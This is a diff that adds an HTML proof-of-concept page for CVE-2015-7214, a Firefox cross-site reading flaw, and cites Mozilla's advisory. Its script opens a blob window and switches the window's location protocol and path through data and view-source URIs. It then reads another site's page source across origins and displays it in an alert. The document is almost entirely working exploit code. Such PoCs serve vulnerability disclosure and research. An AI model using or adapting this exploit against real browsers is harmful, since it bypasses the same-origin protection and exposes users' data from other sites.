@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>[CVE-2015-7214] Cross-site reading attack through data and view-source URIs PoC</title>
+    <meta name="description" content="https://www.mozilla.org/en-US/security/advisories/mfsa2015-149/">
+    <script>
+    function unescapeHTML(str) {
+        return str.replace(/&lt;/g,"<")
+                  .replace(/&gt;/g,">")
+                  .replace(/&amp;/g,"&");
+    }
+
+    function poc() {
+        var blob = new Blob(["blob"], {type : "text/html"});
+        var url  = window.URL.createObjectURL(blob);
+        var w    = window.open(url, "blob");
+
+        var path = "view-source:https://www.mozilla.jp";
+
+        var lp  = function() { w.location.protocol = "data"; };
+        var lpn = function() { w.location.pathname = path; };
+        var lp2 = function() { w.location.protocol = "view-source"; };
+        var alt = function() {
+            var content = unescapeHTML(w.document.body.innerHTML);
+            alert(content.replace(/<pre>|<\/pre>/g, ""));
+        };
+
+        setTimeout(function() { lp();  }, 1000);
+        setTimeout(function() { lpn(); }, 2000);
+        setTimeout(function() { lp2(); }, 3000);
+        setTimeout(function() { alt(); }, 4000);
+    }
+    </script>
+</head>
+<body>
+    <a href="#" onclick="poc()">Click me.</a>
+</body>
+</html>
